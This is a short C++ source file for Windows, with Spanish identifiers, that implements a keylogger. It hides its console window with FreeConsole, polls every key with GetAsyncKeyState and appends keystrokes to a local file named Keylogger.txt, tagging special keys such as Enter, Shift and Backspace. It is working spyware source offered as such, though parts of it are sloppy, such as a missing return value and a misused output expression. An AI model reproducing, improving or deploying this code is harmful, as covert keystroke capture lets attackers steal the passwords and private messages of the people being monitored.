#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
 
using namespace std;
 
void CrearArchivo ( LPCSTR texto )
{
    ofstream archivo ;
    archivo.open ( "Keylogger.txt" , fstream :: app ) ;
    archivo << texto ;
    archivo.close ( ) ;
}
 
bool TeclasPulsadas ( int tecla )
{
    switch ( tecla )
    {
        case VK_SPACE :
            cout << "" ;
            CrearArchivo ( "" ) ;
            break ;
        case VK_RETURN :
            cout << " \n " ;
            CrearArchivo ( "{INTRO}" ) ;
            break ;
        case VK_SHIFT :
            cout << "{SHIFT}" ;
            CrearArchivo ( "{SHIFT}" ) ;
            break ;
        case VK_BACK :
            cout << "{RETROCESO}" ;
            CrearArchivo ( "{RETROCESO}" ) ;
            break ;
 
        default: return false ;
    }
}
 
int main ( )
{
    FreeConsole ( ) ; 
    unsigned char pulsada ;
    while ( true )
    {
        Sleep ( 10 ) ;
        for ( pulsada = 8 ; pulsada <= 255 ; pulsada ++ )
        {
            if ( GetAsyncKeyState ( pulsada ) == - 32767 )
            {
                if ( TeclasPulsadas ( pulsada ) == false )
                {
                    cout << pulsada ;
                    ofstream archivo ;
                    archivo.open ( "Keylogger.txt" , fstream :: app ) ;
                    archivo << pulsada,  "/n" ;
                    archivo.close ( ) ;
                }
            }
        }
    }
}
